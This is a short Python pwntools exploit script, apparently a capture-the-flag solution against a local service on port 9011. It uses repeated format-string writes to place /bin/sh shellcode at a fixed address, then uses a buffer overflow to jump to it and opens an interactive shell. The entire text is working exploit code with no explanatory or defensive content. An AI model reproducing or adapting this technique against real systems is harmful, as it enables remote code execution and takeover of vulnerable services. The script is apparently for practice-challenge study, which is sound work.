from pwn import *

SHELL = 'jhH\xb8/bin///sPH\x89\xe71\xf6j;X\x99\x0f\x05'
START = 0x602440

p = remote('localhost', 9011)

def talk(wait, send):
	s = p.recvuntil(wait)
	s += send
	p.sendline(send)
	print s

talk('name? : ', 'hero')

offset = 0
while offset < len(SHELL):
	low = SHELL[offset]
	high = SHELL[offset+1]
	char = ord(high)*256 + ord(low)
	talk('> ', '2')

	t = '%c%c%c%c%{}c%p%p%p%hn'.format(char - (4 + (2 + 8*2)*3))
	t += 'a'*(24 - len(t))
	t += p64(START + offset)

	talk('hero\n', t)
	offset += 2

talk('> ', '4')
talk('(y/n)', 'n')
talk('> ', '3')
talk('\n', 'a'*24 + p64(START))
talk('> ', '2')
p.interactive()

